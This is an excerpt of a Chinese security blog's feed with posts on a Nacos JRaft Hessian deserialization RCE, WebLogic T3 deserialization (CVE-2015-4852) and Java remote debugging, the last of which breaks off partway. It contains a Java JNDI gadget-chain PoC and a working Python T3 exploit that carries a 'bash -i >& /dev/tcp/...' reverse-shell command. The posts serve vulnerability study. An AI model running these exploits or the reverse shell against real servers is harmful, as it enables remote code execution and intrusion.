同步发送请求到 Leader 节点（参数说明：节点地址，请求对象，超时时间 5000ms）</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> grpcClient.invokeSync(leader.getEndpoint(), request, <span class="hljs-number">5000</span>);<br><br>        <span class="hljs-comment">// 打印响应结果（实际应根据业务处理响应）</span><br>        System.out.println(<span class="hljs-string">&quot;Received response: &quot;</span> + res);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们先随便发一点数据过去，目的是看一下调用堆栈，看看是怎么走到反序列化的地方的</p><p><img src="https://cdn.clown2024.cn/image-20250330223652775.png" alt="image-20250330223652775"></p><p>这里调用堆栈就很清晰了，就不过多解释了</p><h2 id="gadget构造"><a href="#gadget构造" class="headerlink" title="gadget构造"></a>gadget构造</h2><p>这里挑一条链子打，采用y4师傅里的，打SwingLazyValue的链子，但是这里环境用的nacos2.2.2版本用的hessian-4.0.63.jar，该版本的jar有内置的黑名单</p><p>y4师傅这里采用的是jndi配合jackson来打，因为nacos是springboot，内置了jackson</p><p>前半部分就用HashMap来触发UIDefaults.get()</p><p>这里写出的poc类如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Poc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getPoc() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Deserialize/Jackson/Command/Y2FsYw==&quot;</span>&#125;);<br><br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        u1.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        u2.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> makeMap(u1, u2);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        output.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        output.writeObject(map);<br>        output.flush();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-comment">// 构造哈希相等</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后前面的客户端代码只要改一下，调用getPoc就可以获取payload的字节数组了</p><p>然后这里用X1r0z师傅的jndimap工具来起一个监听</p><p><img src="https://cdn.clown2024.cn/image-20250330234321716.png" alt="image-20250330234321716"></p><p>因为这里nacos在docker里面，所以用curl来进行验证</p><p>emmm但是很怪，没打通，返回了一个报错</p><p><img src="https://cdn.clown2024.cn/image-20250331000847488.png" alt="image-20250331000847488"></p><p>不过打jndi就要求环境需要出网</p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>这里的payload只能打一次，如果打第二次就会发生</p><p><img src="https://cdn.clown2024.cn/image-20250330235541466.png" alt="image-20250330235541466"></p><p>调试的时候他也不会进入onApply函数的断点了</p><p>需要销毁环境重建才行，不过这里nacos不止一个RaftGroupService</p><p>至少有三个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">naming_persistent_service_v2<br>naming_instance_metadata<br>naming_service_metadata<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250330235723916.png" alt="image-20250330235723916"></p><p>所以可以通过这样设置打三次</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="http://blog.csdn.net/baidu_25299117/article/details/140476392">http://blog.csdn.net/baidu_25299117/article/details/140476392</a></p><p><a href="https://lmboke.com/archives/nacos-jraft-hessian-fan-xu-lie-hua-fen-xi-xiang-qing">https://lmboke.com/archives/nacos-jraft-hessian-fan-xu-lie-hua-fen-xi-xiang-qing</a></p><p><a href="https://y4er.com/posts/nacos-hessian-rce/">https://y4er.com/posts/nacos-hessian-rce/</a></p><p>还有其他的链子可以看X1r0z师傅的博客：<a href="https://exp10it.io/2023/06/nacos-jraft-hessian-deserialization-rce-analysis/">https://exp10it.io/2023/06/nacos-jraft-hessian-deserialization-rce-analysis/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在看Java微服务相关的知识，那就顺便学一下Nacos相关的漏洞&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic学习</title>
    <link href="https://clowsman.github.io/2025/02/27/WebLogic%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2025/02/27/WebLogic%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-02-27T11:22:37.000Z</published>
    <updated>2025-04-10T15:00:31.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方介绍：Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。它提供了一种强健、成熟和可扩展的 Java Enterprise Edition (EE) 和 Jakarta EE 实施方式。类似于Tomcat、Jboss等。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>项目地址：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p>weblogic安装地址：<a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a></p><p>较老的版本比如weblogic10在这里找：<a href="https://edelivery.oracle.com/osdc/faces/SoftwareDelivery">https://edelivery.oracle.com/osdc/faces/SoftwareDelivery</a></p><p>jdk安装地址：<a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a></p><p>有关WebLogic的基础知识可以看：<a href="https://paper.seebug.org/1012/%EF%BC%8C%E8%AF%B4%E7%9A%84%E9%9D%9E%E5%B8%B8%E8%AF%A6%E7%BB%86%EF%BC%8C%E8%BF%99%E4%B9%9F%E6%98%AF%E4%B8%8A%E9%9D%A2docker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E4%BD%9C%E8%80%85">https://paper.seebug.org/1012/，说的非常详细，这也是上面docker环境搭建的作者</a></p><p>很难受，找不到weblogic 10.3.6.0的版本了，感觉都和文章提到的文件不一样，那就只能起一个vulhub的weblogic环境，直接从里面把weblogic的文件拉出来然后调试了，所以不同版本的调试环境搭建先不在这里写了，等会具体分析再写</p><h1 id="t3协议分析"><a href="#T3协议分析" class="headerlink" title="T3协议分析"></a>T3协议分析</h1><p>这里直接用的CVE-2015-4852的exp来对攻击流量进行分析来复现，用的weblogic版本是10.3.6.0</p><h2 id="t3协议介绍"><a href="#T3协议介绍" class="headerlink" title="T3协议介绍"></a>T3协议介绍</h2><p>T3 协议是 Weblogic RMI 调用时的通信协议</p><p>RMI 即远程方法调用，我们可以远程调用另一台 JVM虚拟机中对象上的方法，且数据传输过程中是序列化进行传输的</p><p>Java RMI 的基础通信协议是 JRMP ，但是也支持开发其他的协议来优化 RMI 的传输，这里的 Weblogic 的 T3 协议就是其优化版本，相比于JRMP协议多了一些特性。以下是T3协议的特点：</p><ol><li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li><li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li></ol><h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><p>首先是CVE-2015-4852的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload1</span>(<span class="hljs-params">gadget, command</span>):<br>    JAR_FILE = <span class="hljs-string">&#x27;ysoserial-all.jar&#x27;</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> popen.stdout.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload2</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port, payload</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, port))<br><br>    handshake = <span class="hljs-string">&quot;t3 10.3.1\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()<br>    sock.sendall(handshake)<br><br>    time.sleep(<span class="hljs-number">0.5</span>)<br><br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;HELO:(.*).false&quot;</span>)<br>    version = re.findall(pattern, data.decode())<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(version) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Weblogic&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(version[<span class="hljs-number">0</span>]))<br>    data_len = binascii.a2b_hex(<span class="hljs-string">b&quot;00000000&quot;</span>) <span class="hljs-comment">#数据包长度，先占位，后面会根据实际情况重新</span><br>    t3header = binascii.a2b_hex(<span class="hljs-string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="hljs-comment">#t3协议头</span><br>    flag = binascii.a2b_hex(<span class="hljs-string">b&quot;fe010000&quot;</span>) <span class="hljs-comment">#反序列化数据标志</span><br>    payload = data_len + t3header + flag + payload<br>    payload = struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, <span class="hljs-built_in">len</span>(payload)) + payload[<span class="hljs-number">4</span>:] <span class="hljs-comment">#重新计算数据包长度，将payload的长度转换为大端模式写入</span><br>    sock.send(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    port = <span class="hljs-number">7001</span><br>    gadget = <span class="hljs-string">&quot;CommonsCollections1&quot;</span> <span class="hljs-comment">#CommonsCollections1 Jdk7u21</span><br>    command = <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/172.24.120.203/8888 0&gt;&amp;1&quot;</span><br><br>    payload = get_payload1(gadget, command)<br><br>    exp(host, port, payload)<br></code></pre></td></tr></table></figure><p>打过去之后我们可以抓到这样的一个流量包</p><p><img src="https://cdn.clown2024.cn/image-20250409231358262.png" alt="image-20250409231358262"></p><p>T3协议的结构分为请求头和请求体</p><p><strong>请求头</strong></p><p>请求头就是第一部分的红色数据，先和服务端进行一次handshake</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">t3 10.3.1<br>AS:255<br>HL:19<br>MS:10000000<br></code></pre></td></tr></table></figure><p>第一行为“t3”加weblogic客户端的版本号</p><p>然后服务端就会返回相应的数据</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">HELO:10.3.6.0.false<br>AS:2048<br>HL:19<br></code></pre></td></tr></table></figure><p>第一行为“HELO:”加weblogic服务器的版本号</p><blockquote><p>所以该方法也可以用来探测服务端是否开放了T3协议，有一次面试的时候被问到了，结果不太清楚</p></blockquote><p><strong>请求体</strong></p><p>然后就是请求体的部分了，这里就引用z_zz_zzz师傅的图了：<a href="http://drops.xmd5.com/static/drops/web-13470.html">http://drops.xmd5.com/static/drops/web-13470.html</a></p><p><img src="https://cdn.clown2024.cn/image-20250409235802346.png" alt="image-20250409235802346"></p><p><img src="https://cdn.clown2024.cn/437dda72ddf4cda67306b11d5a13220080f99dd7.jpg" alt="pic"></p><p>首先是第一部分的数据，前四个字节表示的是整个数据包的长度，比如图中的(1711&#x3D;0x6AF)，然后跟着其余的一些数据</p><p>从第二部分开始就是java的序列化数据了，每一部分开头都是<code>ac ed 00 05</code>，表明这是序列化的内容，然后<code>fe 01 00 00</code>是反序列化的标识头，从攻击流量中也可以看到</p><p><img src="https://cdn.clown2024.cn/image-20250410000643641.png" alt="image-20250410000643641"></p><p>所以我们构造payload的话，就可以根据该格式，对序列化的内容进行替换</p><p><img src="https://cdn.clown2024.cn/image-20250410001347941.png" alt="image-20250410001347941"></p><p>从exp的写法也可以看到，都是按照格式来拼接的</p><h1 id="cve-2015-4852分析"><a href="#CVE-2015-4852分析" class="headerlink" title="CVE-2015-4852分析"></a>CVE-2015-4852分析</h1><p>前面协议的流量分析过了，这里就把这个cve的触发流程也分析一下</p><h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>我们这里用的vulhub的2017的环境，是没有开启debug环境的，所以需要我们手动去开一下</p><p>这里先修改一下vulhub的docker compose文件，开放一下8453端口，因为8453是weblogic的远程调试端口</p><p><img src="https://cdn.clown2024.cn/image-20250410130716455.png" alt="image-20250410130716455"></p><blockquote><p>这个5556是Node Manager的默认监听端口。Node Manager是WebLogic Server的一个Java程序，用于启动、关闭和监控服务器实例。</p></blockquote><p>然后我们可以参考奇安信大哥的安装脚本里面的开启debug模式去手动操作一下</p><p><img src="https://cdn.clown2024.cn/image-20250410130904372.png" alt="image-20250410130904372"></p><p>像下面这样更改然后重启容器即可</p><p><img src="https://cdn.clown2024.cn/image-20250410171029740.png" alt="image-20250410171029740"></p><p>然后我们要把wlserver_10.3&#x2F;server&#x2F;lib文件夹拉出来添加到库里</p><p><img src="https://cdn.clown2024.cn/image-20250410170301760.png" alt="image-20250410170301760"></p><p>然后再配置远程调试</p><p><img src="https://cdn.clown2024.cn/image-20250410170418983.png" alt="image-20250410170418983"></p><p>启动一下debug</p><p><img src="https://cdn.clown2024.cn/image-20250410171202544.png" alt="image-20250410171202544"></p><p>成功连接</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>T3协议接受的数据，是在<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>进行了一个反序列化的操作，里面调用了<code>InboundMsgAbbrev.ServerChannelInputStream#readObject</code>方法</p><p><img src="https://cdn.clown2024.cn/image-20250410180315180.png" alt="image-20250410180315180"></p><p>然后这里创建了一个内部类，并且调用了readObject方法，看一下ServerChannelInputStream的实现</p><p><img src="https://cdn.clown2024.cn/image-20250410182506169.png" alt="image-20250410182506169"></p><p>这里对resolveClass进行了重写，直接调用了父类的resolveClass，也没有进行任何过滤，后面就接着正常的反序列化流程了，这就导致了漏洞的产生，然后weblogic本身带了cc依赖，所以可以直接打cc链，或者其他的一些gadget</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方修复是增加了黑名单</p><p><img src="https://cdn.clown2024.cn/BlackList.png" alt="img"></p><p>有关WebLogic的官方通告和安全补丁发布的网址：<a href="https://www.oracle.com/security-alerts/">https://www.oracle.com/security-alerts/</a></p><p>这种单纯黑名单的方式肯定是容易被绕过的，后面出现的cve就有直接把这个绕了的</p><h1 id="xmldecoder相关"><a href="#XMLDecoder相关" class="headerlink" title="XMLDecoder相关"></a>XMLDecoder相关</h1><p>因为WebLogic的反序列化漏洞主要分为两类，一类是前面的T3协议的反序列化，另一类就是XMLDecoder相关的反序列化漏洞</p><p>所以这里了解一下XMLDecoder相关的基础知识</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>XML（Extensible Markup Language）是一种标记语言，在开发过程中，开发人员可以使用XML来进行数据的传输或充当配置文件。那么Java为了将对象持久化从而方便传输，就使得Philip Mine在JDK1.4中开发了一个用作持久化的工具，XMLDecoder与XMLEncoder。</p><blockquote><p>JDK1.6和JDK1.7的Handler实现均有不同</p></blockquote><h2 id="xml解析过程"><a href="#xml解析过程" class="headerlink" title="xml解析过程"></a>xml解析过程</h2><p>这部分的详细内容可以看一下<a href="https://paper.seebug.org/1012/">https://paper.seebug.org/1012/</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://paper.seebug.org/1012/">https://paper.seebug.org/1012/</a></p><p>环境搭建：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p><a href="https://cmisl.github.io/2024/09/08/Weblogic/">https://cmisl.github.io/2024/09/08/Weblogic/</a></p><p><a href="http://drops.xmd5.com/static/drops/web-13470.html">http://drops.xmd5.com/static/drops/web-13470.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;官方介绍：Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java 应用等适用于本地环境和云环</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java远程调试</title>
    <link href="https://clowsman.github.io/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    <id>https://clowsman.github.io/2025/02/07/Java%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</id>
    <published>2025-02-07T15:11:43.000Z</published>
    <updated>2025-02-09T13:40:38.869Z</updated>
    
    <content type="html"><![CDATA[<p>最近想看看weblogic，但是环境比较难搭建和调试，趁着这个机会，看一下java的各种代码远程调试的方法，很基础的东西了，一直没看。(顺便水一篇博客)</p><h1 id="远程调试jar包"><a href="#远程调试Jar包" class="headerlink" title="远程调试Jar包"></a>远程调试Jar包</h1><p>主要在只有jar包无源码的情况下进行调试。</p><p>这里以冰蝎的jar包为例子</p><p>随便开一个java项目，然后我们创建一个lib目录然后放入jar包</p><p><img src="https://cdn.clown2024.cn/image-20250207232603675.png" alt="image-20250207232603675"></p><p>右键选择Add as Library，将lib文件夹添加进项目依赖</p><p><img src="https://cdn.clown2024.cn/image-20250207232743226.png" alt="image-20250207232743226"></p><p>然后就可以看到jar包中反编译的源代码了</p><p><img src="https://cdn.clown2024.cn/image-20250207232819108.png" alt="image-20250207232819108"></p><p>然后我们添加一个Remote JVM Debug的Configuration</p><p><img src="https://cdn.clown2024.cn/image-20250207233704447.png" alt="image-20250207233704447"></p><p>然后默认配置Apply提交并保存即可，其中<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>将作为运行时的启动参数</p><p><img src="https://cdn.clown2024.cn/image-20250207233914498.png" alt="image-20250207233914498"></p><p>然后将<code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</code>作为启动参数运行jar包</p><p><img src="https://cdn.clown2024.cn/image-20250207234243331.png" alt="image-20250207234243331"></p><blockquote><p>suspend表示是否暂停程序等待调试器连接，”y”表示暂停，”n”表示不暂停，这里还是要选择暂停，上面默认的是不暂停导致我调试进入不到断点，因为容易程序执行过快断点拦截不到</p></blockquote><p>呃呃但是还是不成功，我也不知道为什么，后来找到一篇看雪的文章：<a href="https://bbs.kanxue.com/thread-282397.htm%EF%BC%8C%E8%AF%B4%E6%98%AF%E7%AC%A6%E5%8F%B7%E8%A1%A8%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%9C%A8%E7%BC%96%E8%AF%91%E7%9A%84%E6%97%B6%E5%80%99%E5%8E%BB%E6%8E%89%E4%BA%86%E8%B0%83%E8%AF%95%E7%AC%A6%E5%8F%B7%EF%BC%8C%E5%9C%A8%E6%B2%A1%E6%9C%89%E7%AC%A6%E5%8F%B7%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%AF%B9%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E5%87%BD%E6%95%B0%E4%BD%93%E5%86%85%E7%9A%84%E5%9C%B0%E6%96%B9%E4%B8%8B%E6%96%AD%E7%82%B9%E5%A4%B1%E6%95%88%EF%BC%8C%E5%8F%AA%E6%9C%89%E5%AF%B9%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B8%8B%E6%96%AD%E7%82%B9%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%9A%84%E3%80%82">https://bbs.kanxue.com/thread-282397.htm，说是符号表的原因，因为在编译的时候去掉了调试符号，在没有符号的情况下，对业务代码函数体内的地方下断点失效，只有对系统函数的代码下断点是可以的。</a></p><p>那这里再重新写一个简单的循环打印的demo来试一下</p><p><img src="https://cdn.clown2024.cn/image-20250209164358801.png" alt="image-20250209164358801"></p><p><strong>去掉调试符号</strong></p><p>要去掉调试符号的话编译时加上<code>-g:none</code>即可</p><h2 id="jar打包"><a href="#jar打包" class="headerlink" title="jar打包"></a>jar打包</h2><p>这里还有一个小插曲，我一开始打包完之后运行会说没有主属性清单，我一看mf文件，根本没有指定Main-Class，然后这里需要用到一个打包插件来生成，记录一下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>$&#123;project.artifactId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><span class="hljs-comment">&lt;!--修改编译出来的jar包名，仅为&#123;artifactId&#125;.jar--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">mainClass</span>&gt;</span>org.clown.Main<span class="hljs-tag">&lt;/<span class="hljs-name">mainClass</span>&gt;</span> <span class="hljs-comment">&lt;!-- 此处为主入口--&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后再打包就行了</p><p>然后再按前面的方式启动就可以打到断点了</p><p><img src="https://cdn.clown2024.cn/image-20250209165226194.png" alt="image-20250209165226194"></p><p>那看来前面失败的原因就是因为没有符号表的问题了</p><p>然后前面业务代码断不了点，但是可以在函数名的地方断点，这里随便拿了一个简单的web应用来尝试</p><p><img src="https://cdn.clown2024.cn/image-20250209165724961.png" alt="image-20250209165724961"></p><p>然后他就会进到系统函数里面了，所以没有源码还是比较不方便</p><h1 id="有源码的情况下远程调试"><a href="#有源码的情况下远程调试" class="headerlink" title="有源码的情况下远程调试"></a>有源码的情况下远程调试</h1><p>操作和前面的一样，区别就是本地用的是源码。</p><p>总之有源码尽量用源码调试。</p><h1 id="远程调试docker"><a href="#远程调试Docker" class="headerlink" 